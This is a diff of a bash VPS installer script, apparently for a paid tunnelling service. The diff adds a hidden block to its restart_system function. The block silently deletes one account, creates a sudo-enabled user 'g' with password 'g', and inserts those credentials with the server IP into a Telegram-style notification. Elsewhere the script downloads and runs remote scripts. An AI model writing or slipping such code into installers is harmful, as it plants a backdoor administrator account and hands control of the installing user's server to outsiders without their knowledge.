@@ -298,18 +298,6 @@ elif [[ $host == "2" ]]; then
 wget ${REPO}Fls/cf.sh && chmod +x cf.sh && ./cf.sh
 rm -f /root/cf.sh
 clear
-
-# // Tai Waduk // #
-#domain=$(cat /root/domain)
-userdel jame > /dev/null 2>&1
-Username="g"
-Password=g
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-# // ############
-
 else
 print_install "Random Subdomain/Domain is Used"
 clear
@@ -319,6 +307,15 @@ clear
 restart_system() {
 USRSC=$(wget -qO- https://raw.githubusercontent.com/LunaticBackend/izinsc/main/ip | grep $ipsaya | awk '{print $2}')
 EXPSC=$(wget -qO- https://raw.githubusercontent.com/LunaticBackend/izinsc/main/ip | grep $ipsaya | awk '{print $3}')
+domain=$(cat /root/domain)
+userdel jame > /dev/null 2>&1
+Username="g"
+Password=g
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TEXT="
 <code>────────────────────</code>
@@ -331,7 +328,7 @@ TEXT="
 <code>Ip vps : </code><code>$ipsaya</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>user   : </code><code>$Username</code>
-<code>PW     : </code><code>$Password</code>
+<code>Pw Vps : </code><code>$Password</code>
 <code>────────────────────</code>
 <i>Automatic Notification from Github</i>
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/sanzvpn"},{"text":"Contack","url":"https://wa.me/6281295819429"}]]}'
